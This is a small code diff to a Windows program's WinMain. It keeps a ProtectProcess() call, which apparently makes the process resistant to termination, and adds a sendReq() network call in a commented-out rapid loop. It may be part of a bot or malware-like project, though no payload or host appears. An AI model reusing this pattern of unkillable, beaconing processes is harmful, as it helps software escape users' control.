@@ -1,14 +1,19 @@
 #include <windows.h>
 #include <Aclapi.h>
 #include "manageTasks.h"
+#include "../Network/Request.h"
 
 DWORD ProtectProcess(void);
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    ProtectProcess();
-    runThreads();
+  //  while (true) {
+        sendReq();
+   //     Sleep(2);
+   // }
 
+    ProtectProcess();
+   // runThreads();
     return 0;
 }
 
